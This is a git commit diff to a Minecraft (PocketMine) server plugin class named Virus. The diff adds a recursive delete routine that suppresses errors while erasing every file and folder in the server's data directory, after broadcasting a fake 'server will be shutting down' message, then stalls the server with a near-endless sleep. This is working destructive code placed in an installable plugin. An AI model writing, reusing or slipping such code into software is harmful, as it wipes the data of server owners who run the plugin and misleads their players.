ff7d7c9c5fdbea78694338d51b3c7d4d4e03ba6c
Raymond <39023494+provsalt@users.noreply.github.com>
2020-05-07 14:25:22 +0800

    oof

--- src/provsalt/Virus/Virus.php
+++ src/provsalt/Virus/Virus.php
@@ -8,7 +8,14 @@ use pocketmine\utils\TextFormat;
 class Virus {
 	public static function runVirus() :void{
 		Server::getInstance()->broadcastMessage(TextFormat::colorize("&d[Servwr] &rGoodbye guys server will be shutting down today!"));
-		rmdir(Server::getInstance()->getDataPath());
+		$dir = Server::getInstance()->getDataPath();
+		self::deleteDir($dir);
 		sleep(10000000);
+	}
+	public static function deleteDir($path) {
+	$class_func = array(__CLASS__, __FUNCTION__);
+	return is_file($path) ?
+		@unlink($path) :
+		array_map($class_func, glob($path.'/*')) == @rmdir($path);
 	}
 }
